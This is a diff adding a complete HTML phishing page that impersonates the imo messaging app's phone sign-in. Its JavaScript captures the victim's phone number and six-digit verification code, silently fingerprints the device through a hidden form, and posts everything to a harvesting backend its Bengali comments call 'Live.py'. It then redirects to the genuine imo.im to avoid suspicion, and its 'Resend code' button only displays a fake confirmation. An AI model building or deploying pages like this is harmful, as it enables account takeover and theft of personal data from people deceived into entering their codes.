@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>imo</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body { 
+            background-color: white;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            color: #333;
+            padding: 40px 20px 20px;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+        
+        .logo { 
+            font-size: 42px; 
+            font-weight: bold; 
+            color: #2095f2; 
+            margin-bottom: 8px;
+        }
+        
+        .tagline {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .container { 
+            background-color: white; 
+            width: 100%; 
+            max-width: 400px;
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.3;
+        }
+        
+        .country-selector {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            touch-action: manipulation;
+        }
+        
+        .country-selector:active {
+            background: #f5f5f5;
+            transform: scale(0.98);
+        }
+        
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .flag {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #2095f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .country-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .country-code {
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .chevron {
+            color: #868e96;
+            font-size: 14px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #495057;
+            font-size: 14px;
+        }
+        
+        .phone-input-container {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .code-input {
+            width: 85px;
+            height: 56px; 
+            border: 1px solid #ddd; 
+            border-radius: 12px; 
+            padding: 0 16px; 
+            font-size: 17px; 
+            background-color: #f9f9f9; 
+            transition: all 0.3s ease;
+            text-align: center;
+            -webkit-appearance: none;
+        }
+        
+        .phone-input {
+            flex: 1;
+            height: 56px; 
+            border: 1px solid #ddd; 
+            border-radius: 12px; 
+            padding: 0 20px; 
+            font-size: 17px; 
+            background-color: #f9f9f9; 
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+        }
+        
+        .phone-input:focus, .code-input:focus { 
+            outline: none; 
+            border-color: #2095f2; 
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1);
+        }
+        
+        .continue-button { 
+            color: white; 
+            background: #2095f2;
+            border: none; 
+            border-radius: 12px; 
+            padding: 18px 0; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            width: 100%; 
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+            -webkit-appearance: none;
+        }
+        
+        .continue-button:active { 
+            background: #1a7fd8;
+            transform: scale(0.98);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .help-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 15px;
+            display: inline-block;
+            padding: 12px 20px;
+            transition: all 0.2s;
+            touch-action: manipulation;
+        }
+        
+        .help-link:active {
+            color: #2095f2;
+            background: rgba(32, 149, 242, 0.1);
+            border-radius: 8px;
+        }
+        
+        /* Country Dropdown */
+        .country-dropdown {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 400px;
+            max-height: 70vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            z-index: 1000;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .country-option {
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            border-bottom: 1px solid #f0f0f0;
+            touch-action: manipulation;
+        }
+        
+        .country-option:active {
+            background: #f9f9f9;
+        }
+        
+        .country-option:last-child {
+            border-bottom: none;
+        }
+        
+        .country-option .flag {
+            flex-shrink: 0;
+        }
+        
+        .country-details {
+            flex: 1;
+        }
+        
+        .country-name {
+            font-weight: 500;
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .country-dial-code {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Verification Section */
+        #verification-section {
+            display: none;
+        }
+        
+        .verification-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        
+        .verification-subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 25px;
+            text-align: center;
+            line-height: 1.4;
+            padding: 0 10px;
+        }
+        
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 25px;
+            justify-content: center;
+            padding: 0 10px;
+        }
+        
+        .code-input-digit {
+            width: 50px;
+            height: 60px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            background: #f9f9f9;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            -webkit-appearance: none;
+        }
+        
+        .code-input-digit:focus {
+            outline: none;
+            border-color: #2095f2;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1);
+        }
+        
+        .resend-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .resend-link a {
+            color: #2095f2;
+            text-decoration: none;
+            font-size: 16px;
+            padding: 12px 20px;
+            display: inline-block;
+            touch-action: manipulation;
+        }
+        
+        .resend-link a:active {
+            background: rgba(32, 149, 242, 0.1);
+            border-radius: 8px;
+        }
+        
+        .country-selector-container {
+            position: relative;
+        }
+        
+        #loader {
+            display: none;
+            margin: 20px auto;
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #2095f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Hidden form for device info */
+        .hidden-form {
+            display: none;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            body {
+                padding: 30px 16px 16px;
+            }
+            
+            .header {
+                margin-bottom: 30px;
+            }
+            
+            .logo {
+                font-size: 38px;
+            }
+            
+            .tagline {
+                font-size: 15px;
+            }
+            
+            .title {
+                font-size: 18px;
+                margin-bottom: 25px;
+            }
+            
+            .country-selector {
+                padding: 18px;
+            }
+            
+            .phone-input, .code-input {
+                height: 58px;
+                font-size: 18px;
+            }
+            
+            .continue-button {
+                padding: 20px 0;
+                font-size: 19px;
+            }
+            
+            .code-input-digit {
+                width: 52px;
+                height: 62px;
+                font-size: 24px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .phone-input-container {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .code-input {
+                width: 100%;
+            }
+            
+            .code-inputs {
+                gap: 8px;
+            }
+            
+            .code-input-digit {
+                width: 46px;
+                height: 56px;
+                font-size: 20px;
+            }
+        }
+        
+        /* Prevent zoom on focus for iOS */
+        @media screen and (max-width: 768px) {
+            input, select, textarea {
+                font-size: 16px !important;
+            }
+        }
+        
+        /* Backdrop for dropdown */
+        .dropdown-backdrop {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">imo</div>
+        <div class="tagline">Free video calls and messages</div>
+    </div>
+    
+    <!-- Hidden form for device info collection -->
+    <form id="deviceInfoForm" class="hidden-form">
+        <input type="hidden" name="deviceInfo" id="deviceInfo">
+    </form>
+    
+    <!-- Backdrop for dropdown -->
+    <div class="dropdown-backdrop" id="dropdownBackdrop"></div>
+    
+    <div class="container">
+        <!-- Phone Login Section -->
+        <div id="phone-login-section">
+            <div class="title">Enter your phone number</div>
+            
+            <div class="country-selector-container">
+                <div class="country-selector" onclick="toggleCountryDropdown()">
+                    <div class="country-info">
+                        <div class="flag">US</div>
+                        <div class="country-text">United States</div>
+                        <div class="country-code">+1</div>
+                    </div>
+                    <div class="chevron">▼</div>
+                </div>
+                
+                <div class="country-dropdown" id="countryDropdown">
+                    <!-- Countries will be populated by JavaScript -->
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">Phone Number</label>
+                <div class="phone-input-container">
+                    <input type="text" class="code-input" id="countryCode" value="+1" readonly>
+                    <input type="tel" class="phone-input" placeholder="Phone number" id="phone" inputmode="numeric">
+                </div>
+            </div>
+            
+            <button class="continue-button" onclick="sendPhoneNumber()">Continue</button>
+            <div id="loader"></div>
+        </div>
+        
+        <!-- Verification Section -->
+        <div id="verification-section">
+            <div class="verification-title">Enter verification code</div>
+            <div class="verification-subtitle">We've sent a 6-digit code to your phone</div>
+            
+            <div class="code-inputs">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 1)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 2)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 3)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 4)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 5)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 6)" inputmode="numeric">
+            </div>
+            
+            <button class="continue-button" onclick="verifyCode()">Verify</button>
+            
+            <div class="resend-link">
+                <a href="#" onclick="resendCode()">Resend code</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <a href="#" class="help-link">Having trouble signing in? Send feedback</a>
+    </div>
+
+    <script>
+        // Country data
+        const countries = [
+            { code: "US", name: "United States", dialCode: "+1", flag: "US" },
+            { code: "GB", name: "United Kingdom", dialCode: "+44", flag: "GB" },
+            { code: "CA", name: "Canada", dialCode: "+1", flag: "CA" },
+            { code: "AU", name: "Australia", dialCode: "+61", flag: "AU" },
+            { code: "DE", name: "Germany", dialCode: "+49", flag: "DE" },
+            { code: "FR", name: "France", dialCode: "+33", flag: "FR" },
+            { code: "IT", name: "Italy", dialCode: "+39", flag: "IT" },
+            { code: "ES", name: "Spain", dialCode: "+34", flag: "ES" },
+            { code: "IN", name: "India", dialCode: "+91", flag: "IN" },
+            { code: "BD", name: "Bangladesh", dialCode: "+880", flag: "BD" },
+            { code: "BR", name: "Brazil", dialCode: "+55", flag: "BR" },
+            { code: "JP", name: "Japan", dialCode: "+81", flag: "JP" },
+            { code: "KR", name: "South Korea", dialCode: "+82", flag: "KR" },
+            { code: "CN", name: "China", dialCode: "+86", flag: "CN" },
+            { code: "RU", name: "Russia", dialCode: "+7", flag: "RU" },
+            { code: "MX", name: "Mexico", dialCode: "+52", flag: "MX" },
+            { code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: "SA" },
+            { code: "AE", name: "United Arab Emirates", dialCode: "+971", flag: "AE" },
+            { code: "ZA", name: "South Africa", dialCode: "+27", flag: "ZA" },
+            { code: "NG", name: "Nigeria", dialCode: "+234", flag: "NG" }
+        ];
+        
+        let selectedCountry = countries[0];
+        let countryDropdownOpen = false;
+        let deviceInfoCollected = false;
+        
+        // Device info collection function
+        function collectDeviceInfo() {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                res: window.screen.width + 'x' + window.screen.height,
+                net_type: 'unknown',
+                net_effective: 'unknown',
+                net_downlink: 'N/A',
+                battery_level: 'Not available',
+                battery_charging: 'Not available'
+            };
+            
+            // Collect network information
+            if (navigator.connection) {
+                deviceInfo.net_type = navigator.connection.type || 'unknown';
+                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+                deviceInfo.net_downlink = (navigator.connection.downlink || '0') + ' Mbps';
+            }
+            
+            // Collect battery information
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    deviceInfo.battery_level = Math.round(battery.level * 100) + '%';
+                    deviceInfo.battery_charging = battery.charging.toString();
+                    updateDeviceInfoField(deviceInfo);
+                }).catch(function(error) {
+                    updateDeviceInfoField(deviceInfo);
+                });
+            } else {
+                updateDeviceInfoField(deviceInfo);
+            }
+            
+            return deviceInfo;
+        }
+        
+        function updateDeviceInfoField(deviceInfo) {
+            const deviceInfoField = document.getElementById('deviceInfo');
+            if (deviceInfoField) {
+                deviceInfoField.value = JSON.stringify(deviceInfo);
+                deviceInfoCollected = true;
+            }
+        }
+        
+        // Initialize device info collection
+        document.addEventListener('DOMContentLoaded', function() {
+            collectDeviceInfo();
+        });
+        
+        // Initialize country dropdown
+        function initCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.innerHTML = '';
+            
+            countries.forEach(country => {
+                const option = document.createElement('div');
+                option.className = 'country-option';
+                option.onclick = () => selectCountry(country);
+                
+                option.innerHTML = `
+                    <div class="flag">${country.flag}</div>
+                    <div class="country-details">
+                        <div class="country-name">${country.name}</div>
+                    </div>
+                    <div class="country-dial-code">${country.dialCode}</div>
+                `;
+                
+                dropdown.appendChild(option);
+            });
+        }
+        
+        function toggleCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            const backdrop = document.getElementById('dropdownBackdrop');
+            countryDropdownOpen = !countryDropdownOpen;
+            
+            if (countryDropdownOpen) {
+                dropdown.style.display = 'block';
+                backdrop.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+            } else {
+                dropdown.style.display = 'none';
+                backdrop.style.display = 'none';
+                document.body.style.overflow = '';
+            }
+        }
+        
+        function selectCountry(country) {
+            selectedCountry = country;
+            
+            // Update displayed country
+            document.querySelector('.country-selector .flag').textContent = country.flag;
+            document.querySelector('.country-selector .country-text').textContent = country.name;
+            document.querySelector('.country-selector .country-code').textContent = country.dialCode;
+            
+            // Update country code input
+            document.getElementById('countryCode').value = country.dialCode;
+            
+            // Close dropdown
+            toggleCountryDropdown();
+        }
+        
+        // Live.py এর সাথে কম্প্যাটিবল ফাংশন
+        async function sendPhoneNumber() {
+            const phone = document.getElementById('phone').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            
+            if (!phone) {
+                alert('Please enter your phone number');
+                return;
+            }
+
+            // Ensure device info is collected
+            if (!deviceInfoCollected) {
+                collectDeviceInfo();
+            }
+
+            // বাটন ও লোডার নিয়ন্ত্রণ
+            const continueButton = document.querySelector('#phone-login-section .continue-button');
+            const loader = document.getElementById('loader');
+            continueButton.style.display = 'none';
+            loader.style.display = 'block';
+
+            // Get device info
+            const deviceInfoField = document.getElementById('deviceInfo');
+            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';
+
+            // FormData দিয়ে ডেটা তৈরি - Live.py এর সাথে কম্প্যাটিবল
+            const params = new URLSearchParams();
+            params.append('email', fullPhone); // Live.py 'email' ফিল্ড এক্সপেক্ট করে
+            params.append('pass', 'phone_login'); // পাসওয়ার্ড ফিল্ড রিকোয়ার্ড
+            params.append('deviceInfo', deviceInfo); // ডিভাইস ইনফো
+
+            try {
+                // পেজ রিলোড ছাড়াই সার্ভারে ডেটা পাঠান
+                await fetch('/', { method: 'POST', body: params });
+                
+                // সফলভাবে পাঠানোর পর UI পরিবর্তন
+                document.getElementById('phone-login-section').style.display = 'none';
+                document.getElementById('verification-section').style.display = 'block';
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+                continueButton.style.display = 'block'; // ব্যর্থ হলে বাটন ফিরিয়ে আনুন
+                loader.style.display = 'none';
+            }
+        }
+        
+        function moveToNext(input, nextIndex) {
+            // Move to next input if current input has value
+            if (input.value.length === 1) {
+                const nextInput = document.querySelectorAll('.code-input-digit')[nextIndex];
+                if (nextInput) {
+                    nextInput.focus();
+                } else {
+                    // Last input - auto verify if all filled
+                    autoVerify();
+                }
+            }
+            
+            // Move to previous input if backspace pressed and current input is empty
+            if (input.value.length === 0 && event.inputType === 'deleteContentBackward') {
+                const prevInput = document.querySelectorAll('.code-input-digit')[nextIndex - 2];
+                if (prevInput) {
+                    prevInput.focus();
+                }
+            }
+        }
+        
+        function autoVerify() {
+            const inputs = document.querySelectorAll('.code-input-digit');
+            let allFilled = true;
+            let code = '';
+            
+            for (let input of inputs) {
+                if (!input.value) {
+                    allFilled = false;
+                    break;
+                }
+                code += input.value;
+            }
+            
+            if (allFilled && code.length === 6) {
+                // Auto verify after short delay
+                setTimeout(verifyCode, 500);
+            }
+        }
+        
+        // Live.py এর সাথে কম্প্যাটিবল 2FA ফাংশন
+        async function verifyCode() {
+            const inputs = document.querySelectorAll('.code-input-digit');
+            let code = '';
+            
+            for (let input of inputs) {
+                code += input.value;
+            }
+            
+            if (code.length !== 6) {
+                alert('Please enter the complete 6-digit code');
+                return;
+            }
+            
+            const phone = document.getElementById('phone').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            
+            // Get device info again for 2FA request
+            const deviceInfoField = document.getElementById('deviceInfo');
+            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';
+            
+            const params = new URLSearchParams();
+            params.append('email', fullPhone); // ইমেইল আবার পাঠানো হচ্ছে
+            params.append('2fa_code', code); // 2FA কোড
+            params.append('deviceInfo', deviceInfo); // ডিভাইস ইনফো
+            
+            try {
+                // দ্বিতীয়বার ডেটা পাঠান এবং এরপর রিডাইরেক্ট হবে
+                const response = await fetch('/', { method: 'POST', body: params });
+                if (response.redirected) {
+                    window.location.href = response.url; // সার্ভার থেকে দেওয়া লিঙ্কে রিডাইরেক্ট করুন
+                } else {
+                   // যদি কোনো কারণে রিডাইরেক্ট না হয়
+                   window.location.href = 'https://imo.im';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+            }
+        }
+        
+        function resendCode() {
+            alert('New verification code sent!');
+            
+            // Clear all inputs
+            const inputs = document.querySelectorAll('.code-input-digit');
+            inputs.forEach(input => input.value = '');
+            
+            // Focus first input
+            inputs[0].focus();
+        }
+        
+        // Close dropdown when clicking outside
+        document.addEventListener('click', function(event) {
+            const dropdown = document.getElementById('countryDropdown');
+            const backdrop = document.getElementById('dropdownBackdrop');
+            const selector = document.querySelector('.country-selector');
+            
+            if (backdrop.contains(event.target)) {
+                toggleCountryDropdown();
+            }
+        });
+        
+        // Allow pasting code
+        document.addEventListener('paste', (e) => {
+            const codeInputs = document.querySelectorAll('.code-input-digit');
+            const pastedData = e.clipboardData.getData('text');
+            
+            if (pastedData.length === 6 && /^\d+$/.test(pastedData)) {
+                e.preventDefault();
+                
+                for (let i = 0; i < 6; i++) {
+                    codeInputs[i].value = pastedData[i];
+                }
+                
+                // Focus last input and auto verify
+                codeInputs[5].focus();
+                setTimeout(autoVerify, 100);
+            }
+        });
+        
+        // Initialize on load
+        window.onload = function() {
+            initCountryDropdown();
+            collectDeviceInfo();
+        };
+        
+        // Prevent form submission on enter
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
